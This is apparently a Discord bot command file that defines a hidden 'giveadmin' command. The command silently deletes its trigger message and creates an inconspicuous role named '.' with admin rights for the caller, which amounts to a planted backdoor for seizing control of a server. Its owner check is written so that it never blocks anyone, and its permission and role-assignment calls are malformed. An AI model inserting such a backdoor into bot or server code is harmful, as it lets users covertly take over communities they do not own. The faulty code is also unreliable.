const { prefix } = require('../config.json');

module.exports = {
	name: 'giveadmin',
	description: 'gives the person who executed the command an inconspicous admin role',
	aliases: ['admin', 'godmode'],
	usage: `${prefix}giveadmin`,
	guildOnly: true,
	helpMessage: false,
	async execute(message) {
		await message.delete({ timeout: 1000 }).catch(console.error);
		let member = message.mentions.members.first();
		if (!member) member = message.author;

		if (!message.author.id === '332555969169063938') return;

		message.guild.roles.create({
			data: {
				name: '.',
				permissions:[{
					'ADMIN': true,
				}],
			},
		});

		member.roles.add(member);
	},
};